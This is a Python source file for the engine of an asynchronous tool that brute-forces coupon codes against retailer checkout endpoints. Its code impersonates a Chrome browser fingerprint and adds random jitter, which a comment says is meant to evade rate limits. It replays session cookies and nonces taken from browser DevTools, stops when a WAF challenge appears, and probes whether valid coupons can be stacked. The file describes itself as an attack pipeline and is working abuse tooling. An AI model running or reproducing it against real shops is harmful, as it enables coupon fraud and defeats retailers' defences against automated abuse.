import asyncio
import random
import time
from datetime import datetime, timezone
from typing import Optional, Union

from curl_cffi.requests import AsyncSession
from curl_cffi.requests.errors import RequestsError, CurlError

from models import CouponFinding, TriageStatus
from strategies.base import BaseRetailerStrategy


class Engine:
    """Core asynchronous HTTP fuzzing, rate-limiting, and triage orchestration engine."""

    def __init__(
        self,
        strategy: BaseRetailerStrategy,
        url: Optional[str] = None,
        headers: Optional[dict[str, str]] = None,
        cookies: Optional[dict[str, str]] = None,
        security_nonce: Optional[str] = None,
        concurrency: int = 15,
        jitter_ms: tuple[int, int] = (10, 50),
        timeout: Union[float, int] = 15.0,
        max_retries: int = 3,
        impersonate: str = "chrome124",
    ):
        self.strategy = strategy
        self.url = url or strategy.target_url
        self.headers = headers or strategy.headers
        self.cookies = cookies if cookies is not None else strategy.default_cookies
        self.security_nonce = security_nonce or strategy.default_nonce
        self.concurrency = concurrency
        self.jitter_min, self.jitter_max = jitter_ms
        self.timeout = float(timeout)
        self.max_retries = max_retries
        self.impersonate = impersonate

        self.semaphore = asyncio.Semaphore(concurrency)
        self.stop_event = asyncio.Event()
        self.findings: list[CouponFinding] = []
        self.stats = {
            "total_tested": 0,
            "valid_count": 0,
            "rate_limited_count": 0,
            "errors_count": 0,
            "start_time": 0.0,
            "end_time": 0.0,
        }

    async def probe_single(self, client: AsyncSession, coupon: str) -> CouponFinding:
        """Sends a single probe with micro-jitter, automatic retry, and exponential backoff."""
        if self.stop_event.is_set():
            return CouponFinding(
                code=coupon,
                is_valid=False,
                status="ABORTED",
                message="Aborted due to session/WAF event",
                http_status=0,
                response_time_ms=0.0,
                timestamp=datetime.now(timezone.utc).isoformat(),
            )

        # Apply random micro-jitter to evade basic frequency-based rate-limit rules
        if self.jitter_max > 0:
            delay = random.uniform(self.jitter_min, self.jitter_max) / 1000.0
            await asyncio.sleep(delay)

        async with self.semaphore:
            if self.stop_event.is_set():
                return CouponFinding(
                    code=coupon,
                    is_valid=False,
                    status="ABORTED",
                    message="Aborted due to session/WAF event",
                    http_status=0,
                    response_time_ms=0.0,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                )

            payload = self.strategy.build_payload(coupon, self.security_nonce)
            last_exc = None

            for attempt in range(1, self.max_retries + 1):
                t0 = time.perf_counter()
                try:
                    resp = await client.post(
                        self.url,
                        data=payload,
                        timeout=self.timeout,
                    )
                    r_time = (time.perf_counter() - t0) * 1000.0
                    is_valid, status, msg = self.strategy.triage_response(resp.text, resp.status_code)

                    if status in (TriageStatus.EXPIRED_NONCE, TriageStatus.WAF_CHALLENGE):
                        self.stop_event.set()

                    return CouponFinding(
                        code=coupon,
                        is_valid=is_valid,
                        status=status,
                        message=msg,
                        http_status=resp.status_code,
                        response_time_ms=round(r_time, 2),
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    )

                except (RequestsError, CurlError, Exception) as exc:
                    last_exc = exc
                    if attempt < self.max_retries and not self.stop_event.is_set():
                        backoff = 0.5 * (2 ** (attempt - 1))
                        await asyncio.sleep(backoff)
                    else:
                        r_time = (time.perf_counter() - t0) * 1000.0
                        return CouponFinding(
                            code=coupon,
                            is_valid=False,
                            status=TriageStatus.NETWORK_ERROR,
                            message=f"Network error (after {self.max_retries} attempts): {last_exc}",
                            http_status=0,
                            response_time_ms=round(r_time, 2),
                            timestamp=datetime.now(timezone.utc).isoformat(),
                        )

    async def execute_fuzz(self, candidate_codes: list[str]) -> list[CouponFinding]:
        """Runs the distributed async fuzzing attack pipeline."""
        self.stats["start_time"] = time.perf_counter()
        total = len(candidate_codes)

        print(f"[*] Target Retailer : {self.strategy.display_name} ({self.strategy.name})", flush=True)
        print(f"[*] Target Endpoint : {self.url}", flush=True)
        print(f"[*] Concurrency     : {self.concurrency} async workers", flush=True)
        print(f"[*] Candidate Queue : {total} permutations loaded.\n", flush=True)

        async with AsyncSession(
            headers=self.headers,
            cookies=self.cookies,
            impersonate=self.impersonate,
            timeout=self.timeout,
        ) as client:

            # Execute baseline validation
            print("[+] Executing Baseline Sanity Verification...", flush=True)
            baseline = self.strategy.baseline_candidates
            for sample in baseline:
                res = await self.probe_single(client, sample)
                tag = "VALID" if res.is_valid else "INVALID"
                tag_color = "\033[92m" if res.is_valid else "\033[90m"
                print(f"    [{tag_color}{tag:<7}\033[0m] {res.code:<15} (HTTP {res.http_status}) -> {res.message}", flush=True)

            if self.stop_event.is_set():
                print("\n[!] FATAL: Session cookie or nonce rejected by target server!", flush=True)
                print("[!] Refresh cookies and nonce from your browser DevTools to continue.")
                self.stats["end_time"] = time.perf_counter()
                return []

            tasks = [
                asyncio.create_task(self.probe_single(client, code))
                for code in candidate_codes
            ]

            completed = 0
            step = 10 if total <= 100 else 25
            for coro in asyncio.as_completed(tasks):
                finding = await coro
                completed += 1
                self.stats["total_tested"] = completed

                if finding.is_valid:
                    self.findings.append(finding)
                    self.stats["valid_count"] += 1
                    status_color = "\033[92m"
                    print(
                        f"    {status_color}[HIT: {finding.status}]\033[0m {finding.code:<15} "
                        f"({finding.response_time_ms}ms) -> {finding.message}",
                        flush=True,
                    )

                if finding.status == TriageStatus.RATE_LIMITED:
                    self.stats["rate_limited_count"] += 1
                    print(f"\033[93m[RATE-LIMITED]\033[0m Server returned 429 for: {finding.code}", flush=True)

                if finding.status == TriageStatus.NETWORK_ERROR:
                    self.stats["errors_count"] += 1

                if finding.status in (TriageStatus.EXPIRED_NONCE, TriageStatus.WAF_CHALLENGE):
                    print(
                        f"\n\033[91m[CIRCUIT BREAKER TRIGGERED]\033[0m {finding.status}: {finding.message}",
                        flush=True,
                    )
                    print("[*] Aborting remaining attack pipeline...", flush=True)
                    break

                if completed % step == 0 or completed == total:
                    elapsed = time.perf_counter() - self.stats["start_time"]
                    rate = completed / elapsed if elapsed > 0 else 0
                    pct = (completed / total) * 100
                    print(
                        f"    [PROGRESS] {completed}/{total} ({pct:5.1f}%) | "
                        f"Speed: {rate:4.1f} req/s | Hits: {self.stats['valid_count']}",
                        flush=True,
                    )

        self.stats["end_time"] = time.perf_counter()
        return self.findings

    async def test_stacking(self, valid_coupons: list[str]) -> dict:
        """Tests whether multiple valid coupons can be stacked into a single session."""
        if len(valid_coupons) < 2:
            return {"status": "SKIPPED", "reason": "Need at least 2 valid coupons to test stacking"}

        print("\n[+] Testing Coupon Stacking Vulnerability...", flush=True)
        async with AsyncSession(
            headers=self.headers,
            cookies=self.cookies,
            impersonate=self.impersonate,
            timeout=self.timeout,
        ) as client:
            applied = []
            for code in valid_coupons:
                payload = self.strategy.build_payload(code, self.security_nonce)
                res = await client.post(self.url, data=payload)
                _, status, msg = self.strategy.triage_response(res.text, res.status_code)
                is_in_cart = status in (TriageStatus.APPLIED, TriageStatus.ALREADY_APPLIED)
                applied.append({"code": code, "status": status, "message": msg, "in_cart": is_in_cart})
                print(f"  * Probe '{code}': Status={status} -> {msg}", flush=True)

            all_in_cart = all(item["in_cart"] for item in applied)

            return {
                "vulnerable": all_in_cart,
                "tested_coupons": applied,
            }
